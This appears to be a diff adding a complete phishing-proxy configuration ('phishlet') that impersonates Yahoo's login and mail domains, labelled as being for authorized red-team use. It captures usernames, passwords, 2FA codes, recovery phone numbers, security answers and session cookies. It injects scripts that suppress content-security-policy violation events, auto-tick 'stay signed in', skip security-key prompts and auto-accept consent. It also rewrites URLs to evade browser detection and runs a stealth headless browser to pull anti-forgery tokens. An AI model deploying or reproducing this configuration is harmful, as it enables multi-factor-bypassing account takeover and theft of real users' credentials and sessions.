@@ -1,0 +1,310 @@
+# Yahoo Mail Phishlet
+# For red team and authorized penetration testing only
+# Author: Red-Queen Team
+# Version: 3.0.0 - December 2024
+#
+# Yahoo uses a multi-step authentication flow with separate
+# username and password pages. This phishlet handles the
+# complete flow including 2FA bypass.
+
+name: 'Yahoo'
+author: 'red-queen'
+min_ver: '3.0.0'
+
+proxy_hosts:
+  # Main Yahoo domains
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'yahoo.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'yahoo.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: '', orig_sub: '', domain: 'yahoo.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'mail', orig_sub: 'mail', domain: 'yahoo.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'guce', orig_sub: 'guce', domain: 'yahoo.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'consent', orig_sub: 'consent', domain: 'yahoo.com', session: true, is_landing: false, auto_filter: true}
+  # API and services
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'login.yahoo.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 's', orig_sub: 's', domain: 'yimg.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: '', orig_sub: '', domain: 'yimg.com', session: false, is_landing: false, auto_filter: true}
+  # Additional auth domains
+  - {phish_sub: 'mg', orig_sub: 'mg', domain: 'mail.yahoo.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'us', orig_sub: 'us', domain: 'mg.mail.yahoo.com', session: true, is_landing: false, auto_filter: true}
+
+sub_filters:
+  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'www.yahoo.com', orig_sub: 'www', domain: 'yahoo.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'mail.yahoo.com', orig_sub: 'mail', domain: 'yahoo.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'guce.yahoo.com', orig_sub: 'guce', domain: 'yahoo.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'consent.yahoo.com', orig_sub: 'consent', domain: 'yahoo.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json']}
+  
+  # Remove security headers that might interfere
+  - triggers_on: 'login.yahoo.com'
+    orig_sub: 'login'
+    domain: 'yahoo.com'
+    search: '</head>'
+    replace: |
+      <script>
+      window.addEventListener('securitypolicyviolation', function(e) {
+        e.stopPropagation();
+      });
+      </script></head>
+    mimes: ['text/html']
+
+auth_tokens:
+  # Main Yahoo session cookies
+  - domain: '.yahoo.com'
+    keys: ['Y', 'T', 'F', 'PH', 'A1', 'A1S', 'A3', 'AO', 'B', 'GUC', 'PRF', 'GUCS', 'AS', 'LS', 'NEXT', '.*,regexp']
+  - domain: 'login.yahoo.com'
+    keys: ['sB', 'B', 'Y', 'T', 'A1', 'A1S', '.*,regexp']
+  - domain: '.login.yahoo.com'
+    keys: ['sB', 'B', 'Y', 'T', '.*,regexp']
+  - domain: 'mail.yahoo.com'
+    keys: ['Y', 'T', 'F', 'A3', '.*,regexp']
+  - domain: 'guce.yahoo.com'
+    keys: ['GUC', 'GUCS', '.*,regexp']
+
+auth_urls:
+  - '/account/challenge'
+  - '/account/verify'
+  - '/account/passwd'
+  - '/config/verify'
+  - '/.src/ym/Username'
+
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    # Account key / 2FA code
+    - key: 'verifyCode'
+      search: '([0-9]{6,8})'
+      type: 'post'
+    - key: 'code'
+      search: '([0-9]{6})'
+      type: 'post'
+    # Phone number for recovery
+    - key: 'phone'
+      search: '(.*)'
+      type: 'post'
+    # Security question answers
+    - key: 'answer1'
+      search: '(.*)'
+      type: 'post'
+    - key: 'answer2'
+      search: '(.*)'
+      type: 'post'
+    # Alternate email
+    - key: 'yid'
+      search: '(.*)'
+      type: 'post'
+    # Browser fingerprint (crumb)
+    - key: 'crumb'
+      search: '(.*)'
+      type: 'post'
+
+#===============================================================================
+# REWRITE URLS - BROWSER DETECTION EVASION
+#===============================================================================
+rewrite_urls:
+  # Clean main login path
+  - trigger:
+      domains: ['login.yahoo.com']
+      paths: ['/']
+    rewrite:
+      path: '/signin'
+      query: []
+
+  # Rewrite password challenge
+  - trigger:
+      domains: ['login.yahoo.com']
+      paths: ['/account/challenge/password']
+    rewrite:
+      path: '/verify/password'
+      query: []
+
+  # Rewrite push notification challenge
+  - trigger:
+      domains: ['login.yahoo.com']
+      paths: ['/account/challenge/push']
+    rewrite:
+      path: '/verify/device'
+      query: []
+
+  # Rewrite TOTP challenge
+  - trigger:
+      domains: ['login.yahoo.com']
+      paths: ['/account/challenge/totp']
+    rewrite:
+      path: '/verify/code'
+      query:
+        - key: 'method'
+          value: 'totp'
+
+  # Rewrite SMS challenge
+  - trigger:
+      domains: ['login.yahoo.com']
+      paths: ['/account/challenge/sms']
+    rewrite:
+      path: '/verify/code'
+      query:
+        - key: 'method'
+          value: 'sms'
+
+  # Hide config verify endpoint
+  - trigger:
+      domains: ['login.yahoo.com']
+      paths: ['/config/verify']
+    rewrite:
+      path: '/confirm'
+      query: []
+
+  # Consent page rewrite
+  - trigger:
+      domains: ['guce.yahoo.com', 'consent.yahoo.com']
+      paths: ['/consent*']
+    rewrite:
+      path: '/agree'
+      query: []
+
+force_post:
+  - path: '/account/challenge/password'
+    search:
+      - {key: 'password', search: '.*'}
+    force:
+      - {key: 'rememberMe', value: 'on'}
+    type: 'post'
+    
+  - path: '/'
+    search:
+      - {key: 'username', search: '.*'}
+    force:
+      - {key: 'signin', value: 'Next'}
+      - {key: 'persistent', value: 'y'}
+    type: 'post'
+
+login:
+  domain: 'login.yahoo.com'
+  path: '/'
+
+js_inject:
+  - trigger_domains: ['login.yahoo.com']
+    trigger_paths: ['/', '/account/challenge', '/config/verify']
+    script: |
+      // Yahoo's multi-step flow handler
+      (function() {
+        // Track username from first step
+        document.addEventListener('submit', function(e) {
+          var form = e.target;
+          var usernameInput = form.querySelector('input[name="username"]');
+          if (usernameInput) {
+            sessionStorage.setItem('yahoo_username', usernameInput.value);
+          }
+        });
+        
+        // Auto-click "Stay signed in"
+        setTimeout(function() {
+          var staySignedIn = document.querySelector('input[name="persistent"]');
+          if (staySignedIn && !staySignedIn.checked) {
+            staySignedIn.click();
+          }
+          
+          // Handle "Remember me" checkbox
+          var rememberMe = document.querySelector('input[name="rememberMe"]');
+          if (rememberMe && !rememberMe.checked) {
+            rememberMe.click();
+          }
+        }, 500);
+        
+        // Skip security key prompt if present
+        var skipBtn = document.querySelector('button[data-theme="secondary"]');
+        if (skipBtn && skipBtn.textContent.toLowerCase().includes('skip')) {
+          skipBtn.click();
+        }
+      })();
+
+  - trigger_domains: ['login.yahoo.com']
+    trigger_paths: ['/account/challenge/push', '/account/challenge/totp']
+    script: |
+      // Handle 2FA challenge pages
+      document.addEventListener('DOMContentLoaded', function() {
+        // For TOTP/SMS code entry
+        var codeInput = document.querySelector('input[name="verifyCode"], input[name="code"]');
+        if (codeInput) {
+          codeInput.addEventListener('input', function() {
+            if (this.value.length >= 6) {
+              var verifyBtn = document.querySelector('button[type="submit"]');
+              if (verifyBtn) {
+                setTimeout(function() {
+                  verifyBtn.click();
+                }, 200);
+              }
+            }
+          });
+        }
+        
+        // Auto-click "Use a different method" to show SMS/TOTP option
+        setTimeout(function() {
+          var altMethod = document.querySelector('a[href*="challenge"], button[data-challenge]');
+          // Check if current challenge is push notification
+          var pushPage = window.location.pathname.includes('/push');
+          if (pushPage && altMethod) {
+            // Give user time to approve push, or click alternative
+          }
+        }, 2000);
+      });
+
+  - trigger_domains: ['guce.yahoo.com', 'consent.yahoo.com']
+    trigger_paths: ['/']
+    script: |
+      // Auto-accept consent forms
+      setTimeout(function() {
+        var acceptBtn = document.querySelector('button[name="agree"], form[name="agree"] button');
+        if (acceptBtn) {
+          acceptBtn.click();
+        }
+      }, 1000);
+
+# Evilpuppet configuration for session token extraction
+evilpuppet:
+  triggers:
+    - trigger_domains: ['login.yahoo.com']
+      trigger_paths: ['/account/challenge']
+      trigger_type: 'url'
+      action: 'extract_token'
+      token_name: 'crumb'
+      
+  interceptors:
+    - domain: 'login.yahoo.com'
+      path: '/account/challenge/password'
+      token_name: 'crumb'
+      inject_to: 'form_field'
+      
+    - domain: 'login.yahoo.com'
+      path: '/'
+      token_name: 'acrumb'
+      inject_to: 'form_field'
+  
+  headless_config:
+    user_agent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+    viewport_width: 1920
+    viewport_height: 1080
+    timeout_ms: 30000
+    stealth_mode: true
+    
+  extraction_rules:
+    - name: 'crumb'
+      type: 'html_attribute'
+      selector: 'input[name="crumb"]'
+      attribute: 'value'
+      
+    - name: 'acrumb'
+      type: 'html_attribute'
+      selector: 'input[name="acrumb"]'
+      attribute: 'value'
+      
+    - name: 'sessionIndex'
+      type: 'html_attribute'
+      selector: 'input[name="sessionIndex"]'
+      attribute: 'value'
